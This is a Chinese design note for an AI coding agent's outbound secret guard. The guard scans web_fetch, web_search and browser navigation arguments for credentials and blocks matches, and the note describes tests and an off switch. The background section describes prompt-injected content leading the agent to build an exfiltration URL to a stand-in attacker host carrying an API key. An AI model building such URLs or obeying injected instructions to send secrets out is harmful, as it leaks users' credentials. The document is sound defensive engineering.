# r101 Outbound Secret Guard（出站外泄防线）

## 背景

OWASP 2026 LLM 应用 Top 10 将 prompt injection 提为 LLM01，并在 LLM02（敏感信息泄露）
中明确要求：**把每一次出站工具调用都当作潜在的数据外泄通道**——工具参数在离开本机前
必须经过 secret 模式扫描/脱敏（"route tool arguments through a redaction layer"）。

ggcode 此前 secret 防护覆盖两个边界：
- **文件写入边界**：`internal/tool/secret_scan.go`（write/edit 后 `security.ScanForSecrets`）
- **显示边界**：`internal/security/display_redact.go`（TUI/GUI/IM 渲染前 `RedactForDisplay`）

**出站网络边界完全缺失**：web_fetch 的 url、web_search 的 query、browser navigate 的
url 若包含会话中读到的凭据（.env、配置文件、源码），或被注入内容诱导构造出的外传 URL
（如 `https://attacker.com/?key=sk-...`），会直接离开本机。

## 实施

- `internal/security/outbound_guard.go`：`CheckOutboundSecrets(content) []OutboundFinding`。
  **零新增检测模式**，直接复用 `displaySecretPatterns`（与 RedactForDisplay 同一列表，
  避免 #1289/#1306 式的模式漂移复发），在出站边界而非显示边界应用。返回
  `{Name, Masked}`，Masked 经 `maskValue` 处理可安全回显。
- `internal/tool/outbound_guard.go`：`guardOutboundSecrets(field, value)` 在命中时返回
  agent 可操作的错误文案（模式名 + 掩码样本 + 修复指引），不泄露明文。
- 接线三处（均在实际网络请求之前）：
  - `web_fetch.Execute`（web_fetch.go，URL 解析前）
  - `WebSearch.Execute`（web_search.go，构造搜索 URL 前）
  - browser `navigate` action（browser.go，doNavigate 前）

## 行为与退出开关

默认 **block**：请求不发出，模型收到错误并被引导"移除 secret 后重试，或引用环境变量
等间接方式"。若目标端点是**自带凭据的合法地址**（如 webhook URL 内嵌 token），用户可：

```
GGCODE_OUTBOUND_SECRET_GUARD=off   # 本会话关闭出站守卫
```

## 范围界定

- `run_command` 不在本守卫范围：任意 shell 串做模式扫描误报率过高，仍由 permission
  模式 + dangerous-command 检测守护。
- IM 出站消息已有显示层 `RedactForDisplay` 覆盖，不重复接线。
- `internal/security` 的检测模式列表不因本改动新增任何条目（191+ detector 纪律）。

## 测试

- `internal/security/outbound_guard_test.go`：模式命中（aws/github/openai/jwt/assignment）、
  干净参数零误报、掩码不含明文、同值去重。
- `internal/tool/outbound_guard_test.go`：守卫文案要素、明文不泄露、env 关闭、
  web_fetch/web_search 端到端阻断、干净 URL 不误伤。

验证：`go build -tags goolm ./...`；`go vet -tags goolm`（linux/windows/darwin）；
`go test -tags goolm -p 1 ./internal/security/ ./internal/tool/ ./cmd/ggcode/` 全绿。
